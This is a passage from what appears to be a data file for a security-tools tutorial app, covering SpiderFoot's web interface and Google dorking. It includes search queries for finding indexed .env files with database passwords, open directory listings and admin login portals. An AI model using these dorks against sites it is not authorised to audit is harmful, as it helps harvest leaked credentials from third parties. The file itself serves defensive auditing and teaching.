        explanation: "Start SpiderFoot web interface at http://127.0.0.1:5001.",
        command: "spiderfoot -l 127.0.0.1:5001",
        expectedOutputSnippet: "[+] SpiderFoot Web Server started at http://127.0.0.1:5001\n[+] Open browser to create new automated scan.",
      },
    ],
    proTips: [
      "Use SpiderFoot Web UI visualizations to map relationships between domain names, IP addresses, and DNS servers.",
    ],
  },
  {
    id: "dorks",
    name: "Google Dorks / GHDB (Google Hacking OSINT)",
    category: "Recon & OSINT",
    summary: "Advanced search operator techniques for discovering exposed sensitive files, admin portals, and credentials.",
    difficulty: "Beginner",
    installCommand: "No installation required. Accessible via Google Search.",
    syntaxPattern: "site:<domain> filetype:<ext> intitle:<title> inurl:<url>",
    whatIsIt: "Google Dorking (also known as Google Hacking) uses advanced search operators (`site:`, `filetype:`, `intitle:`, `inurl:`) to find sensitive information indexed by search engine crawlers, such as exposed backup files, unlinked admin pages, and leaked credentials.",
    whenToUse: "Use Google Dorks during initial passive OSINT auditing to test whether sensitive documents or configuration files are publicly indexed.",
    competingTools: ["Shodan", "Bing Dorks", "GitHub Code Search"],
    flags: [
      { flag: "site:<domain>", label: "Domain Filter", description: "Restricts search results to specified domain.", example: "site:target.com" },
      { flag: "filetype:<ext>", label: "File Extension", description: "Filters for specific file extensions (pdf, env, sql, log, docx).", example: "filetype:env" },
      { flag: "intitle:<title>", label: "Title Keyword", description: "Matches keywords inside web page title.", example: 'intitle:"index of"' },
      { flag: "inurl:<url>", label: "URL Keyword", description: "Matches strings inside web page URL path.", example: "inurl:admin" },
    ],
    tutorialSteps: [
      {
        stepNumber: 1,
        title: "Discover Open Server Directory Indexing",
        explanation: "Find web servers where directory browsing is enabled.",
        command: 'intitle:"index of" "parent directory"',
        expectedOutputSnippet: "Index of /backup\nIndex of /wp-content/uploads",
      },
      {
        stepNumber: 2,
        title: "Find Leaked .env Files with Database Credentials",
        explanation: "Locate indexed `.env` configuration files containing DB passwords.",
        command: "filetype:env DB_PASSWORD",
        expectedOutputSnippet: "DB_HOST=127.0.0.1\nDB_USER=root\nDB_PASSWORD=SuperSecretPass123!",
      },
      {
        stepNumber: 3,
        title: "Find Exposed Admin Login Portals",
        explanation: "Locate unlinked admin login interfaces on target domain.",
        command: "site:target.com inurl:admin OR inurl:login",
        expectedOutputSnippet: "https://target.com/admin/login.php\nhttps://target.com/dashboard/login",
      },
    ],
    proTips: [
      "Use Google's cached pages (`cache:target.com`) to inspect website content that was recently taken offline.",
    ],
  },
];

